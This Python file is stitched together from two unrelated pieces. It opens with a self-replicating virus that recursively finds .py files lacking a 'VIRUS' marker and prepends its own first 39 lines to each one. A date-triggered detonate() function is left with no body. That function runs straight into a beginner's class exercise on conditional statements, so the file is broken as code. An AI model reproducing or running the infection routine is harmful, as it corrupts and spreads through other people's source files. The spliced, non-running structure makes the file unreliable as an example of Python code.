#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
# script: Ops Challenge: Class 09
# Author:  Barbara L. Beaufort
# Date of latest revision: 6/27/2023
# Purpose:  Python Conditional Statements
#Main

#Equals Condition
x = 1964
y = 2023
if y > x:
    print ("y is greater than x")

#Not Equals Condition
a = 33
b = 250
if a != b:
    print ("a does not equal b") # you will get an error
    
#Less Than Condition
d = 99
e = 135
if d < e:
    print ("d is less than e") 

#Less Than or Equal to Condition
f = 348
g = 225
if g <= f:
    print ("Life is Awesome!")
    
    
    
    
